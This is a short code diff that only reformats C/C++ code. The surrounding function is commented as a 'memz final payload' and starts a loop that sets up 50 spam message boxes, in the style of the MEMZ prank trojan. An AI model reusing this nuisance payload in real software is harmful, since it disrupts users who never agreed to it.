@@ -37,10 +37,9 @@ int p2()
 { //memz final payload but random
     fori(50)
     {
-
         //msgbox spam
         DWORD dwID = 0;
-        MSGBOXPARAMS msg = {0};
+        MSGBOXPARAMS msg = { 0 };
         msg.cbSize = sizeof(MSGBOXPARAMS);
         msg.hwndOwner = NULL;
         msg.hInstance = GetModuleHandle(NULL);
